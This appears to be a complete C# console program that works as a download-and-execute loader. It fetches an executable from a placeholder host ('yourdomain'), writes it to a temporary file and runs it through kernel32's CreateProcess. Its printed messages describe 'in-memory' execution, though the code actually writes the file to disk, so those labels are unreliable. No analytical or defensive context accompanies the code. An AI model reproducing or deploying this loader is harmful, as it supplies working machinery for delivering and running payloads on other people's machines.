using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;

class Program
{
    static void Main()
    {
        try
        {
            Console.WriteLine("Fetching executable from: https://yourdomain/tempfile.exe");
            string downloadLink = "https://yourdomain/tempfile.exe";

            Console.WriteLine("Executing in-memory...");
            ExecuteInMemory(downloadLink);
            Thread.Sleep(5000);
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error: " + ex.Message);
            Thread.Sleep(5000);
        }
    }

    static void ExecuteInMemory(string downloadLink)
    {
        try
        {
            Console.WriteLine("Downloading executable...");
            WebClient webClient = new WebClient();
            byte[] exeBytes = webClient.DownloadData(downloadLink);

            Console.WriteLine("Executing in-memory process...");
            IntPtr processHandle = ExecuteInMemory(exeBytes);

            Console.WriteLine("Waiting for process completion...");
            WaitForSingleObject(processHandle, 0xFFFFFFFF);
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error: " + ex.Message);
        }
    }

    static IntPtr ExecuteInMemory(byte[] exeBytes)
    {
        IntPtr processHandle = IntPtr.Zero;

        try
        {
            Console.WriteLine("Creating temporary file...");
            string tempFilePath = CreateTempFile(exeBytes);

            Console.WriteLine($"Starting process: {tempFilePath}");
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            bool success = CreateProcess(
                tempFilePath,
                null,
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                0,
                IntPtr.Zero,
                null,
                ref si,
                out pi
            );

            if (!success)
            {
                throw new Exception("Error at creating Process. Error: " + Marshal.GetLastWin32Error());
            }

            processHandle = pi.hProcess;
            Console.WriteLine($"Process started with handle: {processHandle}");
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error: " + ex.Message);
        }

        return processHandle;
    }

    static string CreateTempFile(byte[] data)
    {
        string tempFilePath = System.IO.Path.GetTempFileName();
        System.IO.File.WriteAllBytes(tempFilePath, data);

        Console.WriteLine($"Temporary file created: {tempFilePath}");
        return tempFilePath;
    }

    const uint INFINITE = 0xFFFFFFFF;

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool CreateProcess(
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        [In] ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation
    );

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFO
    {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }
}
